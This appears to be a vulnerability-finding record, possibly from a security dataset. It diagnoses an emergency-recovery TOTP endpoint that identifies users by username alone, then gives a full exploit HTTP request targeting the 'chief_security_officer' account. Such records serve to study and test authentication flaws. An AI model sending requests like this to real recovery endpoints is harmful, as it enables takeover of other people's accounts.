diagnosis: The emergency recovery TOTP endpoint verifies codes against a user found solely by username in the request body without binding the flow to a verified recovery channel (such as an out-of-band email link). An attacker targeting a known username can exploit timing windows or leaked secrets to generate password reset tokens for arbitrary accounts.
exploit_request:
POST /api/security/recovery-verify HTTP/1.1
Host: recovery.portal.internal:6005
Content-Type: application/json

{
  "username": "chief_security_officer",
  "recoveryTotp": "771923"
}
